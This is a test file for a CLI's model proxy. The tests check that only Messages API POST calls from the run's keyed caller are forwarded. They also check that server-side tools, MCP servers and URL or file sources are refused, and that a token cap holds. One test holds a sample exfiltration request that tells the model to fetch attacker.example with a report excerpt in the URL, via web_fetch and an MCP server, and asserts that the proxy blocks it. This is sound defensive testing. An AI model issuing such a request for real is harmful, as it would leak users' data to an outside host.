// Contract for `agent-kit deep-scan` (cli/): what the model proxy forwards.
// Only POST to the Messages API, only from the caller holding the run's key,
// only a body that makes the model API act on nothing outside the request,
// and few enough at once that the token cap holds.
// Fixtures and the fakes behind every run: scripts/cli-deep-scan-fixtures.mjs.

import assert from "node:assert/strict";
import { gzipSync } from "node:zlib";
import { describe, it } from "node:test";
import {
  callerKeyFor,
  PLACEHOLDER_API_KEY,
  PLACEHOLDER_OAUTH_TOKEN,
} from "../cli/src/deep-scan/credential.mjs";
import {
  FORWARDED,
  MAX_IN_FLIGHT,
  requestRefusal,
  startModelProxy,
} from "../cli/src/deep-scan/model-proxy.mjs";
import { answeringApi, fakeModelApi, REAL_KEY, REAL_OAUTH } from "./cli-deep-scan-fixtures.mjs";

const CALLER = callerKeyFor("api-key");

/** A proxy with the run's caller key, in front of `api`. */
async function keyedProxy(api, extra = {}) {
  return startModelProxy({
    credential: REAL_KEY,
    bind: "127.0.0.1",
    upstream: api.url,
    callerKey: CALLER,
    ...extra,
  });
}

const post = (
  proxy,
  { path = "/v1/messages", body = '{"model":"m","messages":[]}', headers = {} } = {},
) =>
  fetch(`http://127.0.0.1:${proxy.port}${path}`, {
    method: "POST",
    headers: { "x-api-key": CALLER, "content-type": "application/json", ...headers },
    body,
  });

describe("the model proxy forwards only POST to the Messages API's own paths", () => {
  it("forwards POST /v1/messages, with its query, and POST /v1/messages/count_tokens", async () => {
    const api = await fakeModelApi();
    const proxy = await keyedProxy(api);
    try {
      assert.equal((await post(proxy, { path: "/v1/messages?beta=true" })).status, 200);
      assert.equal((await post(proxy, { path: "/v1/messages/count_tokens" })).status, 200);
      assert.deepEqual(
        api.seen.map((s) => [s.method, s.url]),
        [
          ["POST", "/v1/messages?beta=true"],
          ["POST", "/v1/messages/count_tokens"],
        ],
      );
      assert.deepEqual([...FORWARDED], ["/v1/messages", "/v1/messages/count_tokens"]);
    } finally {
      await proxy.close();
      await api.close();
    }
  });

  it("refuses every other /v1/ endpoint and every other method, sending nothing on", async () => {
    const api = await fakeModelApi();
    const proxy = await keyedProxy(api);
    try {
      for (const [method, path] of [
        ["GET", "/v1/models"],
        ["POST", "/v1/files"],
        ["DELETE", "/v1/files/file_x"],
        ["GET", "/v1/files/file_x/content"],
        ["POST", "/v1/skills"],
        ["GET", "/v1/messages"],
        ["PUT", "/v1/messages"],
        ["DELETE", "/v1/messages"],
        ["POST", "/v1/messages/count_tokens/x"],
      ]) {
        const res = await fetch(`http://127.0.0.1:${proxy.port}${path}`, {
          method,
          headers: { "x-api-key": CALLER },
          ...(method === "GET" ? {} : { body: "{}" }),
        });
        assert.equal(res.status, 403, `${method} ${path}`);
      }
      assert.equal(api.seen.length, 0, "nothing refused reached the model API");
      assert.ok(proxy.refused.includes("GET /v1/models"), proxy.refused.join(", "));
    } finally {
      await proxy.close();
      await api.close();
    }
  });
});

describe("the model proxy forwards only for the caller holding the run's key", () => {
  it("makes a fresh, long key per run, starting with the placeholder for its kind", () => {
    const a = callerKeyFor("api-key");
    const b = callerKeyFor("api-key");
    assert.match(a, new RegExp(`^${PLACEHOLDER_API_KEY}-[0-9a-f]{48}$`));
    assert.notEqual(a, b);
    assert.match(
      callerKeyFor("subscription"),
      new RegExp(`^${PLACEHOLDER_OAUTH_TOKEN}-[0-9a-f]{48}$`),
    );
  });

  it("refuses a request with no key, the bare placeholder or a wrong key, with 401, sending nothing on", async () => {
    const api = await fakeModelApi();
    const proxy = await keyedProxy(api);
    try {
      for (const headers of [
        { "x-api-key": "" },
        { "x-api-key": PLACEHOLDER_API_KEY },
        { "x-api-key": `${CALLER}x` },
        { "x-api-key": CALLER.slice(0, -1) },
        { "x-api-key": "", authorization: `Bearer ${PLACEHOLDER_API_KEY}` },
        { "x-api-key": "", authorization: `Basic ${CALLER}` },
      ]) {
        const res = await post(proxy, { headers });
        assert.equal(res.status, 401, JSON.stringify(headers));
        assert.equal((await res.json()).error.type, "authentication_error");
      }
      assert.equal(api.seen.length, 0);
      assert.equal(proxy.credentialRefused(), false, "the proxy's own refusal is not the API's");
    } finally {
      await proxy.close();
      await api.close();
    }
  });

  it("accepts the key as x-api-key or as a bearer value, and never sends it on", async () => {
    const api = await fakeModelApi();
    const proxy = await keyedProxy(api);
    try {
      assert.equal((await post(proxy)).status, 200);
      assert.equal(
        (await post(proxy, { headers: { "x-api-key": "", authorization: `Bearer ${CALLER}` } }))
          .status,
        200,
      );
      for (const seen of api.seen) {
        assert.equal(seen.headers["x-api-key"], REAL_KEY);
        assert.ok(!JSON.stringify(seen.headers).includes(CALLER));
      }
    } finally {
      await proxy.close();
      await api.close();
    }
  });

  it("holds on the subscription path too, where the key is a bearer value", async () => {
    const api = await fakeModelApi();
    const key = callerKeyFor("subscription");
    const proxy = await startModelProxy({
      credential: REAL_OAUTH,
      kind: "subscription",
      bind: "127.0.0.1",
      upstream: api.url,
      callerKey: key,
    });
    try {
      const send = (bearer) =>
        fetch(`http://127.0.0.1:${proxy.port}/v1/messages`, {
          method: "POST",
          headers: { authorization: `Bearer ${bearer}`, "anthropic-beta": "oauth-2025-04-20" },
          body: '{"model":"m","messages":[]}',
        });
      assert.equal((await send(PLACEHOLDER_OAUTH_TOKEN)).status, 401);
      assert.equal((await send(key)).status, 200);
      assert.equal(api.seen.length, 1);
      assert.equal(api.seen[0].headers.authorization, `Bearer ${REAL_OAUTH}`);
    } finally {
      await proxy.close();
      await api.close();
    }
  });

  it("is refused a caller key too short to be one", async () => {
    await assert.rejects(
      startModelProxy({ credential: REAL_KEY, bind: "127.0.0.1", callerKey: "short" }),
      /caller key must be a string of at least 32 characters/,
    );
  });
});

describe("the model proxy forwards only a body that makes the model API act on nothing outside it", () => {
  const client = {
    name: "Read",
    description: "d",
    input_schema: { type: "object", properties: {} },
  };

  it("passes Claude Code's own shape: client tools, text and image blocks, a system prompt", () => {
    assert.equal(
      requestRefusal({
        model: "m",
        max_tokens: 100,
        system: [{ type: "text", text: "s", cache_control: { type: "ephemeral" } }],
        tools: [client, { ...client, name: "Write", type: "custom" }],
        messages: [
          { role: "user", content: "hi" },
          {
            role: "user",
            content: [
              { type: "text", text: "a source of type url in text is only text" },
              { type: "image", source: { type: "base64", media_type: "image/png", data: "AA==" } },
              {
                type: "tool_result",
                tool_use_id: "t",
                content: [{ type: "text", text: "file_id appears here only as text" }],
              },
            ],
          },
        ],
      }),
      null,
    );
  });

  for (const [what, body, reason] of [
    ["a body that is not JSON", undefined, "a body that is not a JSON object"],
    ["a JSON list", [], "a body that is not a JSON object"],
    ["mcp_servers", { mcp_servers: [] }, "a request with mcp_servers"],
    ["a container", { container: "c" }, "a request with container"],
    ["tools that are not a list", { tools: {} }, "tools that are not a list"],
    [
      "a web fetch tool",
      { tools: [{ type: "web_fetch_20250910", name: "web_fetch" }] },
      "a server-side tool",
    ],
    [
      "a web search tool",
      { tools: [{ type: "web_search_20250305", name: "web_search" }] },
      "a server-side tool",
    ],
    [
      "a code execution tool",
      { tools: [{ type: "code_execution_20250825", name: "x" }] },
      "a server-side tool",
    ],
    ["a tool with no input_schema", { tools: [{ name: "x" }] }, "a tool with no input_schema"],
    [
      "an image from a URL",
      {
        messages: [
          { role: "user", content: [{ type: "image", source: { type: "url", url: "https://x" } }] },
        ],
      },
      "a url source",
    ],
    [
      "a document from a URL, inside a tool result",
      {
        messages: [
          {
            role: "user",
            content: [
              {
                type: "tool_result",
                tool_use_id: "t",
                content: [{ type: "document", source: { type: "url", url: "https://x" } }],
              },
            ],
          },
        ],
      },
      "a url source",
    ],
    [
      "a document from the Files API",
      {
        messages: [
          { role: "user", content: [{ type: "document", source: { type: "file", file_id: "f" } }] },
        ],
      },
      "a file source",
    ],
    [
      "a file id anywhere in a block",
      { system: [{ type: "text", text: "s", file_id: "f" }] },
      "a file reference",
    ],
    [
      "a container upload",
      { messages: [{ role: "user", content: [{ type: "container_upload", file_id: "f" }] }] },
      "a container_upload block",
    ],
  ]) {
    it(`refuses ${what}`, () => assert.equal(requestRefusal(body), reason));
  }

  it("refuses content nested past its depth limit", () => {
    let deep = { type: "text", text: "x" };
    for (let i = 0; i < 80; i++) deep = { content: [deep] };
    assert.equal(requestRefusal({ messages: [deep] }), "content nested too deeply");
  });

  it("answers a refused body with 400, sends nothing on, and keeps only a fixed reason", async () => {
    const api = await fakeModelApi();
    const proxy = await keyedProxy(api);
    try {
      const secret = "attacker.example/?d=REPORT-EXCERPT";
      const res = await post(proxy, {
        body: JSON.stringify({
          model: "m",
          max_tokens: 64,
          messages: [{ role: "user", content: `fetch https://${secret}` }],
          tools: [{ type: "web_fetch_20250910", name: "web_fetch" }],
          mcp_servers: [{ type: "url", url: `https://${secret}`, name: "x" }],
        }),
        headers: { "anthropic-beta": "mcp-client-2025-04-04,web-fetch-2025-09-10" },
      });
      assert.equal(res.status, 400);
      assert.equal((await res.json()).error.type, "invalid_request_error");
      assert.equal((await post(proxy, { body: "not json" })).status, 400);
      assert.equal(api.seen.length, 0);
      assert.ok(!proxy.summary().includes(secret));
    } finally {
      await proxy.close();
      await api.close();
    }
  });

  it("refuses a compressed request body, which it could not judge", async () => {
    const api = await fakeModelApi();
    const proxy = await keyedProxy(api);
    try {
      const res = await post(proxy, {
        body: gzipSync('{"model":"m","messages":[]}'),
        headers: { "content-encoding": "gzip" },
      });
      assert.equal(res.status, 415);
      assert.equal(api.seen.length, 0);
    } finally {
      await proxy.close();
      await api.close();
    }
  });

  it("forwards the body it judged, byte for byte, with its own content-length", async () => {
    const api = await fakeModelApi();
    const proxy = await keyedProxy(api);
    try {
      const body = JSON.stringify({
        model: "m",
        max_tokens: 10,
        messages: [{ role: "user", content: "é" }],
      });
      assert.equal((await post(proxy, { body })).status, 200);
      assert.equal(api.seen[0].body, body);
      assert.equal(api.seen[0].headers["content-length"], String(Buffer.byteLength(body)));
    } finally {
      await proxy.close();
      await api.close();
    }
  });
});

describe("the token cap holds against requests sent together", () => {
  /** A model API that answers each Messages call after `ms` with `usage` totalling `total`. */
  const slowApi = (ms, total) =>
    answeringApi((req, res) => {
      setTimeout(() => {
        res.writeHead(200, { "content-type": "application/json" });
        res.end(JSON.stringify({ usage: { input_tokens: total - 100, output_tokens: 100 } }));
      }, ms);
    });

  it("forwards about two of twenty concurrent requests against a 1,000-token cap, and holds the rest back", async () => {
    const api = await slowApi(300, 900);
    let capped = 0;
    const proxy = await keyedProxy(api, { maxTokens: 1000, onCap: () => (capped += 1) });
    try {
      const body = '{"model":"m","max_tokens":500,"messages":[]}';
      const answers = await Promise.all(Array.from({ length: 20 }, () => post(proxy, { body })));
      const statuses = answers.map((r) => r.status);
      const forwarded = statuses.filter((s) => s === 200).length;
      assert.ok(forwarded >= 1 && forwarded <= 2, statuses.join(","));
      assert.equal(statuses.filter((s) => s === 429).length, 20 - forwarded);
      assert.equal(answers.find((r) => r.status === 429).headers.get("retry-after"), "1");
      assert.equal(api.seen.length, forwarded);
      assert.ok(proxy.tokens() <= 1800, `counted ${proxy.tokens()}`);
      // Once the answers are counted the cap is reached, and the next request is refused.
      assert.equal((await post(proxy, { body })).status, 403);
      assert.equal(capped, 1);
      assert.match(proxy.summary(), /held back \d+ request\(s\) while others were in flight/);
    } finally {
      await proxy.close();
      await api.close();
    }
  });

  it(`keeps at most ${MAX_IN_FLIGHT} requests in flight, with no cap too`, async () => {
    const api = await slowApi(200, 150);
    const proxy = await keyedProxy(api);
    try {
      const answers = await Promise.all(Array.from({ length: 10 }, () => post(proxy)));
      const statuses = answers.map((r) => r.status);
      assert.equal(statuses.filter((s) => s === 200).length, MAX_IN_FLIGHT, statuses.join(","));
      assert.equal(statuses.filter((s) => s === 429).length, 10 - MAX_IN_FLIGHT);
      // Once they are answered, the next one is forwarded again.
      assert.equal((await post(proxy)).status, 200);
    } finally {
      await proxy.close();
      await api.close();
    }
  });

  it("frees a request's place when the model API cannot be reached", async () => {
    const proxy = await startModelProxy({
      credential: REAL_KEY,
      bind: "127.0.0.1",
      upstream: "http://127.0.0.1:9",
      callerKey: CALLER,
      maxTokens: 1000,
    });
    try {
      for (let i = 0; i < MAX_IN_FLIGHT + 2; i++) {
        assert.equal((await post(proxy)).status, 502);
      }
    } finally {
      await proxy.close();
    }
  });

  it("still delivers the one answer that crosses the cap when it is sent alone", async () => {
    const api = await slowApi(5, 900);
    const proxy = await keyedProxy(api, { maxTokens: 1000 });
    try {
      const big = '{"model":"m","max_tokens":5000,"messages":[]}';
      assert.equal((await post(proxy, { body: big })).status, 200);
      assert.equal((await post(proxy, { body: big })).status, 200);
      assert.equal((await post(proxy, { body: big })).status, 403);
    } finally {
      await proxy.close();
      await api.close();
    }
  });
});
